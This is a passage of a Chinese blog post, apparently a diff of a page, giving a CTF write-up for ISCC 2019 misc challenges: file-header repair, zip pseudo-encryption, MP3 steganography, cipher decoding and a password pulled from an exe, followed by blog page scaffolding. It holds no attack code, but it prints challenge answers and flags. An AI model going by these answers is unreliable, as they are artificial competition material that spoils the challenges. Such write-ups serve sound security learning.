<span class="string">' '</span>:</span><br><span class="line"></span><br><span class="line">        s1 = s1 + <span class="string">'0'</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> s[i] == <span class="string">' '</span> <span class="keyword">and</span> s[i+<span class="number">1</span>] == <span class="string">' '</span>:</span><br><span class="line"></span><br><span class="line">        s1 = s1 + <span class="string">'1'</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(s1) == <span class="number">8</span>:</span><br><span class="line"></span><br><span class="line">        print(s1,chr(int(s1,<span class="number">2</span>)))</span><br><span class="line"></span><br><span class="line">        flag = flag + chr(int(s1,<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">        s1 = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+<p>flag：<code>flag{ISCC_WELCOME}</code></p>
+<h3 id="无法运行的exe"><a href="#无法运行的exe" class="headerlink" title="无法运行的exe"></a>无法运行的exe</h3><p>exe文件用sublime text打开后得到一串密文，用notepad base64解密后得到一个类似png的文件，保存后修改文件头为<strong>89 50 4E 47 0D 0A 1A 0A</strong>得到正确的png文件，是个二维码，扫描就得到了flag</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="\img\ISCC2019\24.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>flag：<code>IScC_2019</code></p>
+<h3 id="最危险的地方就是最安全的地方"><a href="#最危险的地方就是最安全的地方" class="headerlink" title="最危险的地方就是最安全的地方"></a>最危险的地方就是最安全的地方</h3><p>一个jpg文件，winhex打开发现里面有东西，修改文件后缀<strong>zip</strong>，解压后发现是一堆二维码</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="\img\ISCC2019/9.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>一个个用winhex打开发现最后一个<strong>50.jpg</strong>与众不同，flag就藏在里面</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="\img\ISCC2019/10.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>flag：<code>15cC9012</code></p>
+<p>没有flag标签，试了几分钟也是挺坑的，还好手快还有前十血emmm</p>
+<h3 id="解密成绩单"><a href="#解密成绩单" class="headerlink" title="解密成绩单"></a>解密成绩单</h3><p>下载后的文件时一个压缩包，解压需要密码，但是用winhex打开后可以发现文件末尾有<strong>504B</strong>开头的十六进制数，</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="\img\ISCC2019/11.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>发现<strong>0908</strong>说明存在<strong>zip伪加密</strong>，将<strong>09</strong>改为<strong>00</strong>即可</p>
+<p>压缩后时一个exe文件，需要用户名和密码，老样子用winhex打开</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="\img\ISCC2019/12.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>发现<strong>admin</strong>字样，猜测用户名就是<strong>admin</strong>，密码就是后面那串<strong>ISCC</strong>开头的字符，这个密码也尝试了挺久的，因为前后存在混淆的字符</p>
+<p>最后正确的密码是：<strong>ISCCq19pc1Yhb6SqtGhliYH688feCH7lqQxtfa2MpOdONW1wmIleBo4TW5n</strong></p>
+<p>登陆后即可获得flag</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="\img\ISCC2019/13.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure> 
+<h3 id="High起来！"><a href="#High起来！" class="headerlink" title="High起来！"></a>High起来！</h3><p>下载后的压缩包解压后得到一张损坏的<strong>png</strong>图片，在kali下修改png文件头，输入<code>!%xxd</code>进入十六进制编辑</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="\img\ISCC2019/14.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>修改文件头为<strong>8950</strong>后在命令输入<code>!%xxd -r</code>返回原来的编码后保存</p>
+<p> <img src="\img\ISCC2019/15.png" alt=""></p>
+<p>修复后得到一个二维码，扫描后的内容：<strong>中口由羊口中中大中中中井</strong></p>
+<p>查询后发现是一个<strong>当铺密码</strong>，解密网站<a href="http://www.zjslove.com/3.decode/dangpu/index.html" target="_blank" rel="noopener">http://www.zjslove.com/3.decode/dangpu/index.html</a> 解密后得到：<strong>201902252228</strong></p>
+<p>但是这个还不是flag，我们可以发现png图片中还隐藏了一个mp3文件，将png改成zip解压得到<strong>mp3</strong>文件，前面又解密得到了密码，所以很明显就是考察<strong>mp3隐写</strong>，这就需要使用到工具<strong>Mp3stego</strong></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="\img\ISCC2019/16.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>解密后得到<strong>01.mp3.txt</strong>文件，内容是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#102;&amp;#108;&amp;#97;&amp;#103;&amp;#123;&amp;#80;&amp;#114;&amp;#69;&amp;#116;&amp;#84;&amp;#121;&amp;#95;&amp;#49;&amp;#83;&amp;#99;&amp;#67;&amp;#57;&amp;#48;&amp;#49;&amp;#50;&amp;#95;&amp;#103;&amp;#79;&amp;#48;&amp;#100;&amp;#125;</span><br></pre></td></tr></table></figure>
+<p>拿去Unicode解密即可得到flag：<code>flag{PrEtTy_1ScC9012_gO0d}</code></p>
+<p>这里提交的时候也要把flag{}去掉，也是坑</p>
+<h3 id="碎纸机"><a href="#碎纸机" class="headerlink" title="碎纸机"></a>碎纸机</h3><p>原图可以分离成十个图片，分离后的十张图每张图末尾处都不一样</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="\img\ISCC2019\25.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>猜测信息就包含在里面，我们需要将信息提取出来，根据题目提示<strong>欧鹏曦文</strong>猜测可能需要opencv脚本来提取，但是无奈没写过，只能肉眼识别了</p>
+<p>将多出来的这一部分的十六进制复制到notepad++里</p>
+<p>点击 <strong>设置-&gt;首选项-&gt;编辑-&gt;勾选“显示列边界”-&gt;边界宽度设置为51（或26）</strong>，然后 <strong>Ctrl+I</strong> ，文本每行就51个字符自动分行了 </p>
+<p>然后 Ctrl+F-&gt;标记-&gt;查找目标为0-&gt;查找全部 ，就可以给所有0标记颜色，做完这两步后，发现了类似flag的字符：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="\img\ISCC2019\26.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>将10张图片都这样做，选择完整的一边截图然后拼接起来： </p>
+<p><img src="\img\ISCC2019\27.png" alt=""> </p>
+<p>flag：<code>Flag={ISCC_is_so_interesting_!}</code></p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2019-05-25T05:14:05.776Z" itemprop="dateUpdated">2019-05-25 13:14:05</time>
+</span>
+
+
+        
+        原文链接：<a href="/posts/59602/" target="_blank" rel="external">https://Foxgrin.github.io/posts/59602/</a>
+        
+    </div>
+    <footer>
+        <div onclick="location.href='https://Foxgrin.github.io'">
+            <img src="/img/touxiang/1.jpg" alt="Somnus">
+            <a>Somnus</a>
+        </div>
+    </footer>
+</blockquote>
+
+        
+    <div class="page-reward">
+        <nav class="myreward">
+            <a id="rewardBtn" href="javascript:;"><span>打&nbsp;赏</span><span>装成好像很多人打赏的样子</span></a>
+        </nav>
+    </div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://Foxgrin.github.io/posts/59602/&title=《ISCC 2019 Writeup》 — Somnus's blog&pic=https://Foxgrin.github.io/img/touxiang/1.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://Foxgrin.github.io/posts/59602/&title=《ISCC 2019 Writeup》 — Somnus's blog&source=这个比赛虽然总体难度不大，但是不得不感叹河南大军恐怖如斯，不准点做题拿个百血真不容易，垂直上分的大佬频繁出现，说这个比赛是一年一度的py大赛还是有点道理的..." data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://Foxgrin.github.io/posts/59602/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《ISCC 2019 Writeup》 — Somnus's blog&url=https://Foxgrin.github.io/posts/59602/&via=https://Foxgrin.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://Foxgrin.github.io/posts/59602/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/posts/42551/" id="post-prev" class="post-nav-link">
+        <h4 class="title" >
+          上一篇：2019强网杯Web部分题解
+        </h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/posts/6413/" id="post-next" class="post-nav-link">
+        <h4 class="title" data-hover="下一篇：利用Apache解析漏洞(CVE-2017-15715)绕过文件上传限制getshell">下一篇：利用Apache解析漏洞(CVE-2017-15715)绕过文件上传限制getshell</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+    
+
+    
+
+    
+
+
+</article>
+
+</div>
+
+        <footer class="footer">
+    <div class="footer-content">
+        <span class="power">
+            <i class="icon icon-lg icon-copyright"></i>
+            2018
+            <i class="icon icon-lg icon-heart"></i>
+            <a href="https://Foxgrin.github.io">Somnus</a>
+            <br/>
+            Power by
+            <a href="https://hexo.io/" target="_blank" rel="external nofollow">Hexo</a>&nbsp;·&nbsp;
+            Theme
+            <a class="tomotoeslink" href="https://github.com/tomotoes/hexo-theme-tomotoes/" target="_blank" rel="external nofollow">tomotoes</a>
+        </span>
+
+        <br/>
+
+        <span id="RunTime" style="color:#a7a7a2;"></span>
+        <br/>
+
+        <span>
+            
+	<i class="icon icon-lg icon-user">
+<span id="busuanzi_container_site_uv" style='display:none'>
+       访问用户：<span id="busuanzi_value_site_uv"></span>
+    </span>人</i>
+    ·
+    <i class="icon icon-lg icon-eye">
+    <span id="busuanzi_container_site_pv" style='display:none'>
+      访问次数：<span id="busuanzi_value_site_pv"></span>
+    </span>次
+    </i>
+
+
+        </span>
+        <br/>
+
+        <span class="license">This blog is licensed under a <a rel="license" rel="external nofollow" href="https://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International License</a>.</span>
+    </div>
+</footer>
+
+    </main>
+    
+        
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        <span>感谢您的鼓励支持！</span>
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" data-img="/img/dog.png" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/weixin.png" data-alipay="/img/zhifubao.png">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechatPay">&nbsp;&nbsp;微信&nbsp;&nbsp;</span>
+                <span class="reward-toggle-item alipayPay">支付宝</span>
+            </div>
+        </label>
+        
+        <i class="icon icon-caret-up"></i>
+    </div>
+</div>
+
+
+    
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://Foxgrin.github.io/posts/59602/&title=《ISCC 2019 Writeup》 — Somnus's blog&pic=https://Foxgrin.github.io/img/touxiang/1.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://Foxgrin.github.io/posts/59602/&title=《ISCC 2019 Writeup》 — Somnus's blog&source=这个比赛虽然总体难度不大，但是不得不感叹河南大军恐怖如斯，不准点做题拿个百血真不容易，垂直上分的大佬频繁出现，说这个比赛是一年一度的py大赛还是有点道理的..." data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://Foxgrin.github.io/posts/59602/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《ISCC 2019 Writeup》 — Somnus's blog&url=https://Foxgrin.github.io/posts/59602/&via=https://Foxgrin.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://Foxgrin.github.io/posts/59602/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p class="wechatshare">扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAK4AAACuCAAAAACKZ2kyAAABwklEQVR42u3aQY7CMBAEQP7/6ewDdhO6x4kXpPIJIcBlDqNMj1+veB2/Vv7+9a+9nli4uLjL3ONynW0we50f+/RIuLi4G7lnFSP5TFvOrg//xoaLi/uR3LyotQfDxcX9Xm77KHPdxeDi4n4yty00CattmW7u1XBxcRe4eUr53OtH8l1cXNwR9yjXrJmZhaR/fAsXF3cLNy8o7SCkfdxJ9sXFxd3PXR+arsQiRVuFi4v7MPeuYcmsFNbhCC4u7nbudQjSBqnrMegfu+Di4m7kzgrTbGjaHuM0xcHFxd3OndHvGpG+aX5wcXEf5l6z2gtbeWDa7hXdJsPFxX2Y2wYiM2g+WMXFxd3JLU4zGqskA5v878DFxd3DzQOO2XBl1gi1VzRwcXGf4CYlJjlMu31StoqLWbi4uI9xk0eQfLB6V3SCi4v7X9yVNqZF5484w+cvXFzcBe5RroSbj0zq1ggXF3cLd+VKxKz8tWnN8DC4uLjL3HYqm8epSVFrQxlcXNyd3JWR6krLVAeyuLi4X8LNP5+HpHVqgouL+wHcZLO8ESqEuLi4G7krIWkbpM5Gs7i4uDu5s8Fn3va027e/jIuLeyv3B4nSuWhGcFanAAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+
+
+    <!-- waves按钮特效 -->
+<script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<!-- 主题配置脚本 -->
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+</script>
+
+<!-- jquery -->
+<script src="/js/jquery.min.js?v=3.0"></script>
+
+<!-- 搜索 -->
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item waves-block waves-effect" onclick="location.href='{path}'">
+    <div class="title ellipsis" title="{title}">{title}</div>
+</li>
+</template>
+
+
+<!-- main博客脚本 -->
+<script src="/js/main.min.js?v=3.0" ></script>
+
+<!-- 动画&配置 -->
+<script src="/js/script.min.js?v=3.0" ></script>
+
+<!-- 脚本管理 -->
+<script>
+
+if(window.innerWidth > 800){
+	/* 3D标题 */
+	$(".content-header").on("mousemove", threedee);
+
+	/* 底部追随鼠标 */
+	$(".footer").hover(2);
+
+	/* gotop键的涟漪 */
+	$("#gotop").hover(1);
+
+	/* 赞赏的粒子雨 */
+	$("#reward").hover(3);
+
+	/* 微信公众号的底部渲染 */
+	$("#wechat").hover(4);
+
+    /* 标题跳动 */
+    $(".archivestitle").bumpyText();
+
+	/* 图片点击放大 */
+	const postimg = jQuery(".post-content img:not(.github-emoji)");
+	postimg.on("click",function(){
+
+		mask.classList.add("in");
+		main.classList.add("Mask");
+		menu.classList.add("Mask");
+		var myimg = this.cloneNode(true);
+		myimg.classList.add("imgShow");
+
+		setTimeout(function(){
+			jQuery(myimg).animate({
+				opacity:"1"
+			},1000);
+		},0);
+
+		document.body.appendChild(myimg);
+
+		myimg.onclick=function(){
+			document.body.removeChild(myimg);
+			mask.classList.remove("in");
+			main.classList.remove("Mask");
+			menu.classList.remove("Mask");
+		};
+
+	});
+
+}
+
+/* 名字跳动 */
+$("#name").bumpyText();
+
+
+/* 网站运行时间 */
+setInterval(function () {
+	setTime("2018/7/9");
+}, 1000);
+
+/* 文章块的淡出 */
+postshow();
+
+/* 座右铭 */
+
+   getHitokoto();
+
+
+
+/* 粘贴提示 */
+G($(".post-content"), location.href, "Somnus");
+
+
+/* 控制台 */
+if (window.console && window.console.log) {
+	setTimeout(function () {
+		console.log("\n %c 一个坏掉的番茄 %c  © Simon Ma  http://tomotoes.com \n\n", "color:#FFFFFB;background:#1abc9c;padding:5px 0;border-radius:.5rem 0 0 .5rem;", "color:#FFFFFB;background:#080808;padding:5px 0;border-radius:0 .5rem .5rem 0;");
+	}, 0);
+}
+
+</script>
+
+
+
+
+<!-- 公式渲染 -->
+
+
+
+<!-- 不蒜子 -->
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+
+
+</body>
+</html>
